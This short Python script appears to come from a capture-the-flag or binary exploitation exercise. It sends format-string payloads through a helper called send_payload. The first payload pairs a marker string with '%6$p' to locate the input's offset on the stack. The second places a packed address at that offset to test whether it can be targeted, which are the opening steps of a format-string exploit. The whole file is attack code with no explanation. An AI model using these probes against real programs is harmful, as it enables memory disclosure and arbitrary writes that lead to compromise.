from mirage import send_payload

payload = b"ABCDEFGH" + b"%6$p\n"
b, r = send_payload(payload)
print("ABCDEFGH test:", r)

payload2 = b"\x40\x51\x4b\x00\x00\x00\x00\x00" + b"%6$p\n"
b2, r2 = send_payload(payload2)
print("addr test:", r2)
